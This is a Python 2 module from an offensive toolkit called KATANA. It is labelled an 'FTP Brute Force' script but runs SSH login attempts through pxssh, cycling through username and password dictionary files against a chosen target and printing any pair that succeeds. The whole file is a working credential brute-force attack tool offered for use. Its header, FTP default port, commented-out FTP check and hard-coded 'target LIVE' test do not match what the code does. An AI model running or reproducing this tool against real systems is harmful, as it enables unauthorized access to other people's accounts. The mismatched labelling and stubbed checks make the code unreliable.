# KATANA
# FTP Brute Force
# Script by LeSZO ZerO
# 07/03/2015
from core import help
import optparse
import pxssh
import os
import sys
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defaulthost="localhost"
defaultport="20"
defaultdic1="core/db/user.dicc"
defaultdic2="core/db/pass.dicc"
def btssh():
	try:
		global defaulthost,defaultport,defaultdic1,defaultdic2
		actions = raw_input(B+"   bt/ssh > "+W)
		if actions == "show options":
			print "     ["+R+"+"+W+"] options"
			print "     target         : yes"
			print "     port           : no/yes"
			print "     dictionaries   : no/yes\n"
			print "     ["+G+"+"+W+"] options current"
			print "     target         : ",defaulthost
			print "     port           : ",defaultport
			print "     dictionary_1   : ",defaultdic1
			print "     dictionary_2   : ",defaultdic2
			btssh()
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
			btssh()
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
			btssh()
		elif actions[0:16] == "set dictionary_1":
				defaultdic1 = actions[17:]
				print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
				btssh()
		elif actions[0:16] == "set dictionary_2":
				defaultdic2 = actions[17:]
				print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
				btssh()

		elif actions=="back":
			pass 
		elif actions=="exit":
			print C+"   GooD"+W+" bye."
			exit()
		elif actions == "help":
			help.help()

		if actions == "run":
			print("\n     ["+O+"!"+W+"] Checking file")
			if True:
				if True:
					print "     ["+G+"+"+W+"] options current"
					print "     target         : ",defaulthost
					print "     port           : ",defaultport
					print "     dictionary_1   : ",defaultdic1
					print "     dictionary_2   : ",defaultdic2
					print 
					try:
						#ftp = FTP(defaulthost)
						if True:
							print("     ["+G+"+"+W+"] target LIVE")
							print("     ["+G+"+"+W+"] Running")
							try:
								with open(defaultdic1,'r') as user:
									for us in user: 
										with open(defaultdic2,'r') as passs:
											for ps in passs:
												us=us.replace("\n","")
												ps=ps.replace("\n","")
												try:
													connect = pxssh.pxssh()
													connect.login(defaulthost,us,ps)
													if True:
														print "     ["+G+"+"+W+"] SUCCESSFUL with username : "+us+" , password : "+ps+"\n"
														return
												except(KeyboardInterrupt, SystemExit):
													print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
												except:
													print "     ["+O+"!"+W+"] Checking with username : "+us+" , password : "+ps						
							except(KeyboardInterrupt, SystemExit):
								print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
					except:
						print("     ["+R+"-"+W+"] target DEAD")
	except(KeyboardInterrupt, SystemExit):
		print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
	btssh()